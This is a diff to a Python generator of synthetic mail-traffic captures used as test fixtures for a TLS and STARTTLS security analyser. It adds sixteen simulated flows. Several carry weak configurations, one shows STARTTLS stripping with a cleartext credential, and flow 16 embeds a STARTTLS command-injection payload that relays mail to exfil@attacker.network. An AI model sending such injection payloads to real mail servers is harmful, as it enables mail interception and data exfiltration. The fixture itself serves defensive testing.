@@ -149,6 +149,7 @@ def _client_hello(
     cipher_suites: Optional[List[int]] = None,
     sni: str = "mail.example.com",
     alpn_protocols: Optional[List[bytes]] = None,
+    named_groups: Optional[List[int]] = None,
 ) -> bytes:
     """
     Build a minimal or extended TLS ClientHello handshake message.
@@ -171,8 +172,10 @@ def _client_hello(
     sni_list   = struct.pack(">H", len(sni_ext)) + sni_ext
     sni_ext_full = struct.pack(">HH", 0x0000, len(sni_list)) + sni_list
 
-    # 2. supported_groups (0x000A): x25519 (0x001D), secp256r1 (0x0017)
-    groups     = struct.pack(">HH", 0x001D, 0x0017)
+    # 2. supported_groups (0x000A): configurable (defaults to x25519, secp256r1)
+    if named_groups is None:
+        named_groups = [0x001D, 0x0017]
+    groups = b"".join(struct.pack(">H", g) for g in named_groups)
     groups_ext = struct.pack(">HHH", 0x000A, len(groups)+2, len(groups)) + groups
 
     # 3. signature_algorithms (0x000D)
@@ -1388,6 +1391,705 @@ BENCHMARK_SPECS: Dict[str, ScenarioBenchmarkSpec] = {
 }
 
 
+# ===========================================================================
+# MULTI-SESSION ENTERPRISE & ADVERSARIAL SIMULATIONS
+# ===========================================================================
+
+def _gen_enterprise_network_simulation(output_dir: Path) -> Path:
+    """
+    Enterprise Scenario 1: Multi-Session Corporate Mail Perimeter Simulation (16 Flows).
+    Simulates an authentic enterprise network perimeter tap capturing concurrent
+    SMTP (submission, MTA relay), IMAPS, and POP3S traffic across multiple departments,
+    legacy technical debt, and active attack vectors.
+    """
+    base = 1710000000.0
+    all_pkts = []
+
+    # 1. Executive Workstation: IMAPS port 993, TLS 1.3 AES-256-GCM, valid CA cert (LOW)
+    def flow_1():
+        c_ip, s_ip, sp, dp = "10.10.1.15", "10.0.0.1", 52110, 993
+        t0 = base + 0.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=1000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=2000, ack=1001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=1001, ack=2001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302, 0x1301], sni="imap.corp.example.com", alpn_protocols=[b"imap"])
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=1001, ack=2001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="imap.corp.example.com", san_list=["imap.corp.example.com"])
+        ccs = _change_cipher_spec()
+        app = _app_data(b"* OK [CAPABILITY IMAP4rev1] Corporate IMAP Ready\r\n")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert + ccs + app, seq=2001, ack=1001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 2. Engineering Workstation: Submission 587, TLS 1.3, ChaCha20-Poly1305, PQC Hybrid offered (LOW)
+    def flow_2():
+        c_ip, s_ip, sp, dp = "10.10.1.42", "10.0.0.2", 52112, 587
+        t0 = base + 1.2
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=3000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=4000, ack=3001, ts=_ts(t0, 0.001)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=3001, ack=4001, ts=_ts(t0, 0.002)),
+        ]
+        b1 = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=4001, ack=3001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO dev-workstation.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=3001, ack=4001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-mail.corp.example.com\r\n250-STARTTLS\r\n250-PIPELINING\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=4001+len(b1), ack=3001+len(ehlo), ts=_ts(t0, 0.020)))
+        st_cmd = b"STARTTLS\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, st_cmd, seq=3001+len(ehlo), ack=4001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        r2 = b"220 2.0.0 Ready to start TLS\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r2, seq=4001+len(b1)+len(r1), ack=3001+len(ehlo)+len(st_cmd), ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1303, 0x1301], sni="mail.corp.example.com", alpn_protocols=[b"smtp"], named_groups=[0x11EC, 0x001D, 0x0017])
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=3001+len(ehlo)+len(st_cmd), ack=4001+len(b1)+len(r1)+len(r2), ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1303)
+        cert = _build_cert_msg(subject_cn="mail.corp.example.com", san_list=["mail.corp.example.com"])
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=4001+len(b1)+len(r1)+len(r2), ack=3001+len(ehlo)+len(st_cmd)+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    # 3. HR Department: Dovecot IMAPS 993, TLS 1.2 ECDHE-RSA-AES128-GCM (LOW)
+    def flow_3():
+        c_ip, s_ip, sp, dp = "10.10.1.88", "10.0.0.3", 52114, 993
+        t0 = base + 2.0
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=5000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=6000, ack=5001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=5001, ack=6001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F, 0xC030], sni="imap.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=5001, ack=6001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="imap.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=6001, ack=5001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 4. Finance Department: IMAPS 993, TLS 1.3 AES-256-GCM (LOW)
+    def flow_4():
+        c_ip, s_ip, sp, dp = "10.10.1.105", "10.0.0.1", 52116, 993
+        t0 = base + 3.1
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=7000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=8000, ack=7001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=7001, ack=8001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302, 0x1301], sni="imap.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=7001, ack=8001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="imap.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=8001, ack=7001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 5. Marketing Workstation: Submission 587, TLS 1.3 (LOW)
+    def flow_5():
+        c_ip, s_ip, sp, dp = "10.10.1.120", "10.0.0.2", 52118, 587
+        t0 = base + 4.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=9000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=10000, ack=9001, ts=_ts(t0, 0.001)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=9001, ack=10001, ts=_ts(t0, 0.002)),
+        ]
+        b1 = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=10001, ack=9001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO mktg-pc.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=9001, ack=10001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-mail.corp.example.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=10001+len(b1), ack=9001+len(ehlo), ts=_ts(t0, 0.020)))
+        st_cmd = b"STARTTLS\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, st_cmd, seq=9001+len(ehlo), ack=10001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        r2 = b"220 2.0.0 Ready to start TLS\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r2, seq=10001+len(b1)+len(r1), ack=9001+len(ehlo)+len(st_cmd), ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302], sni="mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=9001+len(ehlo)+len(st_cmd), ack=10001+len(b1)+len(r1)+len(r2), ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="mail.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=10001+len(b1)+len(r1)+len(r2), ack=9001+len(ehlo)+len(st_cmd)+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    # 6. External Partner MTA Relay: Port 25 STARTTLS TLS 1.2, ECDHE (LOW)
+    def flow_6():
+        c_ip, s_ip, sp, dp = "198.51.100.20", "10.0.0.4", 50123, 25
+        t0 = base + 5.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=11000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=12000, ack=11001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=11001, ack=12001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 relay.corp.example.com ESMTP Sendmail 8.15.2\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=12001, ack=11001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO mta.partner-network.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=11001, ack=12001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-relay.corp.example.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=12001+len(b1), ack=11001+len(ehlo), ts=_ts(t0, 0.020)))
+        st_cmd = b"STARTTLS\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, st_cmd, seq=11001+len(ehlo), ack=12001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        r2 = b"220 2.0.0 Ready to start TLS\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r2, seq=12001+len(b1)+len(r1), ack=11001+len(ehlo)+len(st_cmd), ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="relay.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=11001+len(ehlo)+len(st_cmd), ack=12001+len(b1)+len(r1)+len(r2), ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="relay.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=12001+len(b1)+len(r1)+len(r2), ack=11001+len(ehlo)+len(st_cmd)+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    # 7. Legal Department: POP3S port 995, TLS 1.3 AES-256-GCM (LOW)
+    def flow_7():
+        c_ip, s_ip, sp, dp = "10.10.1.135", "10.0.0.5", 52122, 995
+        t0 = base + 6.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=12500, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=13500, ack=12501, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=12501, ack=13501, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302, 0x1301], sni="pop.corp.example.com", alpn_protocols=[b"pop3"])
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=12501, ack=13501, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1302)
+        cert = _build_cert_msg(subject_cn="pop.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=13501, ack=12501+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 8. Jenkins CI/CD Automation: Submission 587, TLS 1.3 AES-128-GCM (LOW)
+    def flow_8():
+        c_ip, s_ip, sp, dp = "10.10.1.150", "10.0.0.2", 52124, 587
+        t0 = base + 7.2
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=14000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=15000, ack=14001, ts=_ts(t0, 0.001)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=14001, ack=15001, ts=_ts(t0, 0.002)),
+        ]
+        b1 = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=15001, ack=14001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO jenkins-runner.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=14001, ack=15001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-mail.corp.example.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=15001+len(b1), ack=14001+len(ehlo), ts=_ts(t0, 0.020)))
+        st_cmd = b"STARTTLS\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, st_cmd, seq=14001+len(ehlo), ack=15001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        r2 = b"220 2.0.0 Ready to start TLS\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r2, seq=15001+len(b1)+len(r1), ack=14001+len(ehlo)+len(st_cmd), ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1301], sni="mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=14001+len(ehlo)+len(st_cmd), ack=15001+len(b1)+len(r1)+len(r2), ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0304, cipher_suite=0x1301)
+        cert = _build_cert_msg(subject_cn="mail.corp.example.com")
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=15001+len(b1)+len(r1)+len(r2), ack=14001+len(ehlo)+len(st_cmd)+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    # 9. Warehouse Scanner: Port 587 STARTTLS, TLS 1.0, 3DES, SHA-1 cert (HIGH - Technical Debt)
+    def flow_9():
+        c_ip, s_ip, sp, dp = "10.10.20.10", "10.0.0.2", 49152, 587
+        t0 = base + 8.0
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=16000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=17000, ack=16001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=16001, ack=17001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=17001, ack=16001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO scanner-wh01.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=16001, ack=17001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-mail.corp.example.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=17001+len(b1), ack=16001+len(ehlo), ts=_ts(t0, 0.020)))
+        st_cmd = b"STARTTLS\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, st_cmd, seq=16001+len(ehlo), ack=17001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        r2 = b"220 2.0.0 Ready to start TLS\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r2, seq=17001+len(b1)+len(r1), ack=16001+len(ehlo)+len(st_cmd), ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0301, cipher_suites=[0x000A], sni="mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=16001+len(ehlo)+len(st_cmd), ack=17001+len(b1)+len(r1)+len(r2), ts=_ts(t0, 0.040)))
+        sh = _server_hello(version=0x0301, cipher_suite=0x000A)
+        cert = _build_cert_msg(subject_cn="mail.corp.example.com", is_sha1_sig=True)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=17001+len(b1)+len(r1)+len(r2), ack=16001+len(ehlo)+len(st_cmd)+len(ch), ts=_ts(t0, 0.050)))
+        return pkts
+
+    # 10. Branch Office Relay: Port 25, STARTTLS with Expired X.509 cert (MEDIUM)
+    def flow_10():
+        c_ip, s_ip, sp, dp = "10.10.20.15", "10.0.0.4", 49154, 25
+        t0 = base + 9.0
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=18000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=19000, ack=18001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=18001, ack=19001, ts=_ts(t0, 0.003)),
+        ]
+        b1 = b"220 relay.corp.example.com ESMTP Sendmail 8.15.2\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=19001, ack=18001, ts=_ts(t0, 0.008)))
+        ehlo = b"EHLO branch-mta.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo, seq=18001, ack=19001+len(b1), ts=_ts(t0, 0.015)))
+        r1 = b"250-relay.corp.example.com\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r1, seq=19001+len(b1), ack=18001+len(ehlo), ts=_ts(t0, 0.020)))
+        st_cmd = b"STARTTLS\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, st_cmd, seq=18001+len(ehlo), ack=19001+len(b1)+len(r1), ts=_ts(t0, 0.025)))
+        r2 = b"220 2.0.0 Ready to start TLS\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, r2, seq=19001+len(b1)+len(r1), ack=18001+len(ehlo)+len(st_cmd), ts=_ts(t0, 0.030)))
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="relay.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=18001+len(ehlo)+len(st_cmd), ack=19001+len(b1)+len(r1)+len(r2), ts=_ts(t0, 0.038)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="relay.corp.example.com", expired=True)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=19001+len(b1)+len(r1)+len(r2), ack=18001+len(ehlo)+len(st_cmd)+len(ch), ts=_ts(t0, 0.045)))
+        return pkts
+
+    # 11. Legacy Intranet Client: IMAPS 993, 1024-bit weak RSA cert (HIGH/LOW)
+    def flow_11():
+        c_ip, s_ip, sp, dp = "10.10.20.25", "10.0.0.1", 49156, 993
+        t0 = base + 10.0
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=20000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=21000, ack=20001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=20001, ack=21001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="imap.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=20001, ack=21001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="imap.corp.example.com", key_size=1024)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=21001, ack=20001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 12. Webmail Reverse Proxy: IMAPS 993, SNI Mismatch (MEDIUM)
+    def flow_12():
+        c_ip, s_ip, sp, dp = "10.10.20.30", "10.0.0.1", 49158, 993
+        t0 = base + 11.0
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=22000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=23000, ack=22001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=22001, ack=23001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="mail-proxy.internal.corp")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=22001, ack=23001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="imap.corp.example.com", san_list=["imap.corp.example.com"])
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=23001, ack=22001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 13. Staging/Dev Mail Server: IMAPS 993 with Self-Signed Cert (MEDIUM)
+    def flow_13():
+        c_ip, s_ip, sp, dp = "10.10.40.10", "10.0.0.6", 53100, 993
+        t0 = base + 12.0
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=24000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=25000, ack=24001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=24001, ack=25001, ts=_ts(t0, 0.003)),
+        ]
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="staging-mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=24001, ack=25001, ts=_ts(t0, 0.010)))
+        sh = _server_hello(version=0x0303, cipher_suite=0xC02F)
+        cert = _build_cert_msg(subject_cn="staging-mail.corp.example.com", is_self_signed=True)
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, sh + cert, seq=25001, ack=24001+len(ch), ts=_ts(t0, 0.020)))
+        return pkts
+
+    # 14. Abrupt RST Termination: Port 587, Handshake Incomplete (Robustness test)
+    def flow_14():
+        c_ip, s_ip, sp, dp = "10.10.10.99", "10.0.0.2", 54000, 587
+        t0 = base + 12.8
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=26000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=27000, ack=26001, ts=_ts(t0, 0.001)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=26001, ack=27001, ts=_ts(t0, 0.002)),
+        ]
+        b1 = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b1, seq=27001, ack=26001, ts=_ts(t0, 0.005)))
+        ch = _client_hello(version=0x0304, cipher_suites=[0x1302], sni="mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=26001, ack=27001+len(b1), ts=_ts(t0, 0.010)))
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, b"", "R", seq=27001+len(b1), ack=26001+len(ch), ts=_ts(t0, 0.015)))
+        return pkts
+
+    # 15. Compromised Remote Branch Worker: STARTTLS Stripped by MitM -> Cleartext (CRITICAL, ML Outlier)
+    def flow_15():
+        c_ip, s_ip, sp, dp = "10.10.30.5", "10.0.0.2", 58100, 587
+        t0 = base + 13.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=28000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=29000, ack=28001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=28001, ack=29001, ts=_ts(t0, 0.003)),
+        ]
+        banner = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, banner, seq=29001, ack=28001, ts=_ts(t0, 0.010)))
+        ehlo_cmd = b"EHLO laptop-victim.corp.example.com\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo_cmd, seq=28001, ack=29001+len(banner), ts=_ts(t0, 0.020)))
+        ehlo_resp_stripped = b"250-mail.corp.example.com Hello\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, ehlo_resp_stripped, seq=29001+len(banner), ack=28001+len(ehlo_cmd), ts=_ts(t0, 0.030)))
+        auth_cmd = b"AUTH PLAIN AHZpY3RpbUBjb3JwLmV4YW1wbGUuY29tAHN1cGVyc2VjcmV0cGFzc3dvcmQ=\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, auth_cmd, seq=28001+len(ehlo_cmd), ack=29001+len(banner)+len(ehlo_resp_stripped), ts=_ts(t0, 0.040)))
+        auth_ok = b"235 2.7.0 Authentication successful\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, auth_ok, seq=29001+len(banner)+len(ehlo_resp_stripped), ack=28001+len(ehlo_cmd)+len(auth_cmd), ts=_ts(t0, 0.050)))
+        return pkts
+
+    # 16. DMZ Attacker: STARTTLS Buffer Injection Attack (Poddebniak et al.) (CRITICAL)
+    def flow_16():
+        c_ip, s_ip, sp, dp = "203.0.113.88", "10.0.0.2", 44100, 587
+        t0 = base + 14.5
+        pkts = [
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "S", seq=30000, ack=0, ts=_ts(t0, 0.000)),
+            _tcp_pkt(s_ip, c_ip, dp, sp, b"", "SA", seq=31000, ack=30001, ts=_ts(t0, 0.002)),
+            _tcp_pkt(c_ip, s_ip, sp, dp, b"", "A", seq=30001, ack=31001, ts=_ts(t0, 0.003)),
+        ]
+        banner = b"220 mail.corp.example.com ESMTP Postfix\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, banner, seq=31001, ack=30001, ts=_ts(t0, 0.010)))
+        ehlo_cmd = b"EHLO attacker.network\r\n"
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ehlo_cmd, seq=30001, ack=31001+len(banner), ts=_ts(t0, 0.020)))
+        ehlo_resp = b"250-mail.corp.example.com Hello\r\n250-STARTTLS\r\n250 8BITMIME\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, ehlo_resp, seq=31001+len(banner), ack=30001+len(ehlo_cmd), ts=_ts(t0, 0.030)))
+        injected = (
+            b"STARTTLS\r\n"
+            b"RSET\r\n"
+            b"MAIL FROM:<injected_admin@corp.example.com>\r\n"
+            b"RCPT TO:<exfil@attacker.network>\r\n"
+            b"DATA\r\n"
+        )
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, injected, seq=30001+len(ehlo_cmd), ack=31001+len(banner)+len(ehlo_resp), ts=_ts(t0, 0.040)))
+        ready_resp = b"220 2.0.0 Ready to start TLS\r\n"
+        pkts.append(_tcp_pkt(s_ip, c_ip, dp, sp, ready_resp, seq=31001+len(banner)+len(ehlo_resp), ack=30001+len(ehlo_cmd)+len(injected), ts=_ts(t0, 0.050)))
+        ch = _client_hello(version=0x0303, cipher_suites=[0xC02F], sni="mail.corp.example.com")
+        pkts.append(_tcp_pkt(c_ip, s_ip, sp, dp, ch, seq=30001+len(ehlo_cmd)+len(injected), ack=31001+len(banner)+len(ehlo_resp)+len(ready_resp), ts=_ts(t0, 0.060)))
